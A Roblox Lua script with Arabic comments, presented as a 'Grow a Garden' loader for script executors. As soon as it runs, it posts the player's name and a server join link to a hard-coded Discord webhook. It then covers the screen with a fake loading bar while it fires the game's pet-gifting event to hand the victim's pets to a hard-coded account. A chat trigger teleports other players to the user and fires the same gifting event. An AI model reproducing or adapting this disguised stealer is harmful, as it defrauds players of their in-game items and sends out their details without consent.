-- الخدمات الأساسية
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- رابط Webhook
local webhookUrl = "https://discord.com/api/webhooks/1404963543555768383/6qQU8_ItNMIXpsqtZGDTXuGpO-TdRLbxUDMR_ulseo32MKwxqP8ILq_Lfbt76DNfHGT4"

-- دالة إرسال Webhook
local function sendWebhook(message)
    local data = {
        content = message,
        components = {
            {
                type = 1,
                components = {
                    {
                        type = 2,
                        style = 5,
                        label = "انقر للانتقال للسيرفر",
                        url = "https://www.roblox.com/games/" .. game.PlaceId .. "/?jobId=" .. game.JobId
                    }
                }
            }
        }
    }
    local jsonData = HttpService:JSONEncode(data)
    if syn and syn.request then
        syn.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    elseif http_request then
        http_request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    elseif fluxus and fluxus.request then
        fluxus.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    else
        warn("Executor لا يدعم إرسال HTTP requests.")
    end
end

-- إرسال رسالة فور تشغيل السكربت
sendWebhook("تم تشغيل السكربت بواسطة اللاعب: " .. player.Name)

-- واجهة تحميل كاملة
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.fromRGB(15,15,15)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0.1,0)
title.Position = UDim2.new(0,0,0,0)
title.BackgroundTransparency = 1
title.Text = "🌱 Grow a Garden Loading..."
title.Font = Enum.Font.SourceSansBold
title.TextSize = 40
title.TextColor3 = Color3.fromRGB(0,255,128)

local progressBar = Instance.new("Frame", frame)
progressBar.Size = UDim2.new(0.6,0,0.05,0)
progressBar.Position = UDim2.new(0.2,0,0.6,0)
progressBar.BackgroundColor3 = Color3.fromRGB(50,50,50)

local bar = Instance.new("Frame", progressBar)
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)

local percentage = Instance.new("TextLabel", frame)
percentage.Size = UDim2.new(1,0,0.05,0)
percentage.Position = UDim2.new(0,0,0.65,0)
percentage.BackgroundTransparency = 1
percentage.Text = "0%"
percentage.Font = Enum.Font.SourceSansBold
percentage.TextSize = 28
percentage.TextColor3 = Color3.fromRGB(255,255,255)

for i=1,100 do
    bar.Size = UDim2.new(i/100,0,1,0)
    percentage.Text = i .. "%"
    wait(0.6)
end

percentage.Text = "تم التحميل!"
wait(1)
screenGui:Destroy()

-- إعادة التحكم باللاعب
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
humanoid.WalkSpeed = 16
humanoid.JumpPower = 50
humanoid.AutoRotate = true

-- مراقبة شاتك أنت
player.Chatted:Connect(function(msg)
    if msg == "." then
        -- نقل كل اللاعبين إلى موقعك وإعطاؤهم الحيوانات
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = player.Character.HumanoidRootPart
                p.Character.HumanoidRootPart.CFrame = hrp.CFrame
                if ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService") then
                    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", p)
                end
            end
        end
    end
end)

-- التحقق من اللاعب sssfysue7 وإعطاؤه الحيوانات فور التشغيل
local targetPlayer = Players:FindFirstChild("sssfysue7")
if targetPlayer and ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService") then
    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
end
